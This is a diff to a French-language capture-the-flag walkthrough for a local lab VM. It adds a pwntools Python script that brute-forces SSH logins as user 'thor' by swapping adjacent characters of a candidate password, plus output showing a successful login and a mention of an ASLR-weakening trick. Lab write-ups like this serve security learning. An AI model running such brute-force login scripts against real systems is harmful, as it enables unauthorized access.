@@ -569,7 +569,46 @@ Et la .... c'est le drame. Sa ne marche pas :(
 Le forum nous donne un indice:
 ![img mouettes](./screen/mouettes.png)
 
-Les numéros doivent etre inversé.
+Certaines lettres doivent etre inversé... Python est la pour nous:
+```
+>>> from pwn import *
+>>> import sys
+>>> host="192.168.56.101"
+>>> port=22
+>>> user="thor"
+>>> password="Publicspeakingisveryeasy.126241207201b2149opekmq426315"
+>>> i = 1
+>>> while (1):
+...     if i == len(password):
+...             sys.exit()
+...     pw = ""
+...     start = password[:-i]
+...     end = password[-i:]
+...     letterA = start[-1]
+...     letterB = end[0]
+...     pw = start[:-1] + letterB + letterA + end[1:]
+...     print("Testing password : %s" % pw)
+...     try:
+...             shell = ssh(host=host, port=port, user=user, password=pw)
+...     except:
+...             pass
+...     i += 1
+... 
+Testing password : Publicspeakingisveryeasy.126241207201b2149opekmq426351
+[x] Connecting to 192.168.56.101 on port 22
+[-] Connecting to 192.168.56.101 on port 22: Failed
+Testing password : Publicspeakingisveryeasy.126241207201b2149opekmq426135
+[x] Connecting to 192.168.56.101 on port 22
+[+] Connecting to 192.168.56.101 on port 22: Done
+[*] thor@192.168.56.101:
+    Distro    Ubuntu 12.04
+    OS:       linux
+    Arch:     i386
+    Version:  3.2.0
+    ASLR:     Disabled
+    Note:     Susceptible to ASLR ulimit trick (CVE-2016-3672)
+[...]
+```
 
 Le bon mot de passe est:
 ```
